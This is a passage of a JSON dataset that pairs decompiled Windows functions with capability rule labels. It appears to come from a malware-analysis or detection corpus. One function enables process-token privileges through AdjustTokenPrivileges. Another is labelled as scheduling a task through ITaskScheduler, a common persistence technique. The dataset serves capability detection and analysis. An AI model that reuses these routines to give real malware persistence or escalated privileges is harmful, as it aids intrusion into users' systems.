        "decompiled_code": "\nint32_t __fastcall fcn.0040b1a3(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 454
    },
    "0040bef1": {
        "rules": [
            "schedule task via ITaskScheduler"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040bef1(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint noname_0_00;\n    bool bVar2;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    bVar2 = false;\n    iVar1 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar1) {\n        iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x40f670, 0, 1, 0x40f650, &ppv);\n        if (-1 < iVar1) {\n            iVar1 = (**(*ppv + 0x20))(ppv);\n            if (-1 < iVar1) {\n                iVar1 = fcn.0040bcb6(noname_0_00, arg_ch);\n                if (iVar1 != 0) {\n                    iVar1 = (**(*ppv + 0x24))(ppv);\n                    bVar2 = -1 < iVar1;\n                    if (bVar2) {\n                        (**(*var_4h + 0x30))(var_4h);\n                    }\n                }\n                (**(*var_4h + 8))(var_4h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return bVar2;\n}\n",
        "token_count": 309
    }
}